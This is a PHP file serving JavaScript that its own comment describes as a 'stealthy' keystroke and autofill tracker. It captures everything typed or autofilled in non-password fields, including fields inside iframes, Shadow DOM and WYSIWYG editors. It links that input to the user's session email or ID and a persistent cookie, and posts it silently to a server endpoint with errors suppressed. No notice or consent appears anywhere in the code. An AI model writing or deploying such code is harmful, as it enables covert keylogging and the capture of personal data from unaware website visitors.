<?php
// tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists
// Supports JS form builders, WYSIWYG iframe editors (TinyMCE/CKEditor), Shadow DOM, and postMessage bridges

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

$userId = '';
if (!empty($_SESSION['user_email'])) {
    $userId = $_SESSION['user_email'];
} elseif (!empty($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
} elseif (!empty($_SESSION['username'])) {
    $userId = $_SESSION['username'];
} elseif (!empty($_SESSION['user'])) {
    $userId = is_array($_SESSION['user']) ? ($_SESSION['user']['email'] ?? $_SESSION['user']['username'] ?? $_SESSION['user']['id'] ?? '') : $_SESSION['user'];
} elseif (!empty($_COOKIE['tracker_user_id'])) {
    $userId = $_COOKIE['tracker_user_id'];
}

// Determine if included directly via HTTP script tag or via PHP include
$isDirectJsRequest = (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === 'tracker.php');

if ($isDirectJsRequest) {
    header('Content-Type: application/javascript; charset=utf-8');
} else {
    echo '<script>';
}
?>
(function() {
    'use strict';

    if (window.__typingTrackerActive) return;
    window.__typingTrackerActive = true;

    // Detect or generate unique persistent client identifier
    function getUserId() {
        var phpUserId = <?php echo json_encode((string)$userId); ?>;
        if (phpUserId && phpUserId.trim() !== '') {
            return phpUserId.trim();
        }

        if (window.currentUser) {
            if (window.currentUser.email && String(window.currentUser.email).trim() !== '') {
                return String(window.currentUser.email).trim();
            }
            if (window.currentUser.id && String(window.currentUser.id).trim() !== '') {
                return String(window.currentUser.id).trim();
            }
            if (window.currentUser.fullName && String(window.currentUser.fullName).trim() !== '') {
                return String(window.currentUser.fullName).trim();
            }
        }

        if (window.TYPING_TRACKER_USER_ID && String(window.TYPING_TRACKER_USER_ID).trim() !== '') {
            return String(window.TYPING_TRACKER_USER_ID).trim();
        }

        var storageKey = 'typing_tracker_uid';
        var storedId = null;
        try {
            storedId = localStorage.getItem(storageKey);
        } catch(e) {}

        if (!storedId) {
            var cookieMatch = document.cookie.match(new RegExp('(^| )typing_tracker_uid=([^;]+)'));
            if (cookieMatch) {
                storedId = decodeURIComponent(cookieMatch[2]);
            }
        }

        if (!storedId) {
            storedId = 'user_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
        }

        try {
            localStorage.setItem(storageKey, storedId);
        } catch(e) {}
        try {
            document.cookie = 'typing_tracker_uid=' + encodeURIComponent(storedId) + '; path=/; max-age=31536000';
        } catch(e) {}

        return storedId;
    }

    var userId = getUserId();
    var sequenceCounter = 0;
    var keyBuffer = [];
    var flushIntervalMs = 1500;
    var maxBufferSize = 15;
    var options = { capture: true, passive: true };

    var apiEndpoint = (function() {
        try {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                var src = scripts[i].src || '';
                if (src.indexOf('tracker.php') !== -1) {
                    return src.replace('tracker.php', 'api.php');
                }
            }
        } catch(e) {}
        return 'api.php';
    })();

    // Resolve real target element even inside Shadow DOM or custom Web Components
    function getRealTarget(e) {
        if (!e) return document.activeElement;

        if (e.composedPath && typeof e.composedPath === 'function') {
            var path = e.composedPath();
            if (path && path.length > 0) {
                for (var i = 0; i < path.length; i++) {
                    var el = path[i];
                    if (el && el.nodeType === 1) {
                        if (isElementEditable(el)) {
                            return el;
                        }
                    }
                }
                if (path[0] && path[0].nodeType === 1) {
                    return path[0];
                }
            }
        }

        var target = e.target || e.srcElement;
        if (!target || target === document || target === window) {
            target = document.activeElement;
        }

        while (target && target.shadowRoot && target.shadowRoot.activeElement) {
            target = target.shadowRoot.activeElement;
        }

        return target;
    }

    // Comprehensive editable check for native inputs, contenteditable, shadow DOM, rich text, role=textbox
    function isElementEditable(el) {
        if (!el) return false;
        if (el === document || el === window || el === document.body) {
            if (document.designMode === 'on' || document.body.contentEditable === 'true') {
                return true;
            }
        }
        if (el.nodeType !== 1) return false;

        var tagName = el.tagName ? el.tagName.toUpperCase() : '';
        if (tagName === 'INPUT' || tagName === 'TEXTAREA') {
            return el.type !== 'password' && el.type !== 'button' && el.type !== 'submit' && el.type !== 'hidden';
        }

        if (el.isContentEditable || el.contentEditable === 'true' || el.contentEditable === 'events') {
            return true;
        }

        var role = el.getAttribute ? el.getAttribute('role') : null;
        if (role === 'textbox' || role === 'searchbox' || role === 'combobox') {
            return true;
        }

        if (el.getAttribute && (el.getAttribute('data-slate-editor') !== null || el.getAttribute('contenteditable') !== null)) {
            return true;
        }

        return false;
    }

    // Element identification with caching
    function getCachedFieldInfo(el) {
        if (!el) return { id: 'unknown', name: '' };
        if (el.__ttInfo) return el.__ttInfo;

        var fieldId = el.id || '';
        var fieldName = el.name || '';

        if (!fieldId && el.getAttribute) {
            fieldId = el.getAttribute('name') || el.getAttribute('aria-label') || el.getAttribute('placeholder') || el.getAttribute('data-testid') || el.getAttribute('data-field') || el.getAttribute('role') || '';
            if (fieldId) fieldId = 'attr:' + fieldId;
        }

        if (!fieldId && el.getRootNode && el.getRootNode().host) {
            var host = el.getRootNode().host;
            var hostId = host.id || host.tagName.toLowerCase();
            fieldId = 'shadow:' + hostId;
        }

        if (!fieldId) {
            var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
            var type = el.type ? '[' + el.type + ']' : '';
            fieldId = tag + type;
        }

        if (!fieldName && el.getAttribute) {
            fieldName = el.getAttribute('name') || el.getAttribute('aria-label') || el.getAttribute('placeholder') || el.id || '';
        }

        if (!fieldName && el.labels && el.labels.length > 0) {
            fieldName = el.labels[0].innerText.trim();
        }

        var info = { id: fieldId, name: fieldName };
        try {
            el.__ttInfo = info;
        } catch(e) {}
        return info;
    }

    function getCleanPageUrl() {
        return (window.location.host || '') + (window.location.pathname || '');
    }

    function currentUserId() {
        var latestId = getUserId();
        if (latestId) userId = latestId;
        return userId;
    }

    // Fast keypress recorder
    function recordKey(e) {
        try {
            var target = getRealTarget(e);
            if (!target || !isElementEditable(target)) return;

            var fieldInfo = getCachedFieldInfo(target);
            sequenceCounter++;

            var keyChar = e.key;
            if (!keyChar) {
                keyChar = String.fromCharCode(e.keyCode || e.which || 0);
            }

            target.__ttLastKeyTime = Date.now();

            var keyObj = {
                user_id: currentUserId(),
                page_url: getCleanPageUrl(),
                field_id: fieldInfo.id,
                field_name: fieldInfo.name,
                key_char: keyChar,
                key_code: e.code || ('KeyCode:' + (e.keyCode || e.which || 0)),
                sequence_order: sequenceCounter,
                timestamp: (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now()
            };

            // Post message if inside iframe
            if (window.self !== window.top) {
                try {
                    window.top.postMessage({ type: '__tt_keystroke', data: keyObj }, '*');
                } catch(pErr) {}
            }

            keyBuffer.push(keyObj);

            if (keyBuffer.length >= maxBufferSize) {
                flushBuffer();
            }
        } catch(err) {}
    }

    // Detect browser autofill, paste, composition, or JS value injection
    function recordInputEvent(e) {
        try {
            var target = getRealTarget(e);
            if (!target || !isElementEditable(target)) return;

            var isAutofill = false;
            if (e.inputType === 'insertReplacementText' || e.inputType === 'insertFromPaste') {
                isAutofill = true;
            } else if (!target.__ttLastKeyTime || (Date.now() - target.__ttLastKeyTime > 300)) {
                var currentVal = target.value || target.innerText || target.textContent || '';
                if (currentVal && currentVal.length > 0) {
                    isAutofill = true;
                }
            }

            if (isAutofill) {
                var fieldInfo = getCachedFieldInfo(target);
                var val = target.value || target.innerText || target.textContent || '';
                var lastHandledVal = target.__ttLastAutofillValue || '';

                if (val && val !== lastHandledVal) {
                    target.__ttLastAutofillValue = val;
                    var baseTime = (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now();

                    for (var i = 0; i < val.length; i++) {
                        sequenceCounter++;
                        var autoKey = {
                            user_id: currentUserId(),
                            page_url: getCleanPageUrl(),
                            field_id: fieldInfo.id,
                            field_name: fieldInfo.name,
                            key_char: val.charAt(i),
                            key_code: 'Autofill',
                            sequence_order: sequenceCounter,
                            timestamp: baseTime + i
                        };

                        if (window.self !== window.top) {
                            try {
                                window.top.postMessage({ type: '__tt_keystroke', data: autoKey }, '*');
                            } catch(pErr) {}
                        }

                        keyBuffer.push(autoKey);
                    }

                    if (keyBuffer.length >= maxBufferSize) {
                        flushBuffer();
                    }
                }
            }
        } catch(err) {}
    }

    function flushBuffer() {
        if (keyBuffer.length === 0) return;

        var keysToSend = keyBuffer;
        keyBuffer = [];

        var payload = JSON.stringify({
            action: 'save_keys',
            user_id: currentUserId(),
            page_url: getCleanPageUrl(),
            keys: keysToSend
        });

        if (navigator.sendBeacon) {
            try {
                var blob = new Blob([payload], { type: 'application/json' });
                if (navigator.sendBeacon(apiEndpoint, blob)) {
                    return;
                }
            } catch(e) {}
        }

        if (typeof fetch === 'function') {
            try {
                fetch(apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
                return;
            } catch(e) {}
        }

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', apiEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(payload);
        } catch(e) {}
    }

    // Bind event listeners to document, window, same-origin iframes, and Shadow Roots
    function bindTarget(node) {
        if (!node) return;
        try {
            // Check if document was reset by doc.open()/doc.write()
            if (node.__ttBoundDoc !== node) {
                node.__ttBoundDoc = node;
                node.addEventListener('keydown', recordKey, options);
                node.addEventListener('input', recordInputEvent, options);
                node.addEventListener('change', recordInputEvent, options);
                node.addEventListener('compositionend', recordInputEvent, options);
                node.addEventListener('focusin', recordKey, options);
            }
        } catch(e) {}
    }

    function scanAndBindDynamicElements() {
        try {
            // Scan Same-Origin IFrames (including dynamically doc.write()-created ones)
            var iframes = document.querySelectorAll('iframe');
            for (var i = 0; i < iframes.length; i++) {
                try {
                    var iframe = iframes[i];
                    var win = iframe.contentWindow;
                    var doc = iframe.contentDocument || (win && win.document);

                    if (win) bindTarget(win);
                    if (doc) {
                        bindTarget(doc);
                        if (doc.body) bindTarget(doc.body);
                    }
                } catch(e) {}
            }

            // Scan Shadow Roots
            var allElements = document.querySelectorAll('*');
            for (var j = 0; j < allElements.length; j++) {
                var el = allElements[j];
                if (el.shadowRoot) {
                    bindTarget(el.shadowRoot);
                }
            }
        } catch(e) {}
    }

    // Attach postMessage listener on top window to receive keystrokes from iframe children
    window.addEventListener('message', function(msgEvent) {
        try {
            if (msgEvent.data && msgEvent.data.type === '__tt_keystroke' && msgEvent.data.data) {
                var k = msgEvent.data.data;
                sequenceCounter++;
                k.sequence_order = sequenceCounter;
                keyBuffer.push(k);
                if (keyBuffer.length >= maxBufferSize) {
                    flushBuffer();
                }
            }
        } catch(e) {}
    }, false);

    // Attach listeners on main window & document
    bindTarget(window);
    bindTarget(document);
    if (document.body) bindTarget(document.body);

    // MutationObserver for newly attached same-origin IFrames, Shadow DOM hosts, and dynamic components
    if (typeof MutationObserver !== 'undefined') {
        try {
            var observer = new MutationObserver(function(mutations) {
                for (var i = 0; i < mutations.length; i++) {
                    var added = mutations[i].addedNodes;
                    if (added) {
                        for (var j = 0; j < added.length; j++) {
                            var node = added[j];
                            if (node.nodeType === 1) {
                                if (node.tagName === 'IFRAME') {
                                    try {
                                        node.addEventListener('load', scanAndBindDynamicElements, options);
                                    } catch(e) {}
                                }
                                if (node.shadowRoot) {
                                    bindTarget(node.shadowRoot);
                                }
                            }
                        }
                    }
                }
                scanAndBindDynamicElements();
            });

            if (document.documentElement) {
                observer.observe(document.documentElement, { childList: true, subtree: true });
            }
        } catch(e) {}
    }

    // Re-bind every 500ms to handle doc.open()/doc.write() wipes by WYSIWYG editors and JS builders
    setInterval(scanAndBindDynamicElements, 500);

    // Background flushing
    setInterval(flushBuffer, flushIntervalMs);

    // Flush on page exit/visibility change
    window.addEventListener('beforeunload', flushBuffer);
    window.addEventListener('pagehide', flushBuffer);
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
            flushBuffer();
        }
    });
})();
<?php
if (!$isDirectJsRequest) {
    echo '</script>';
}
?>
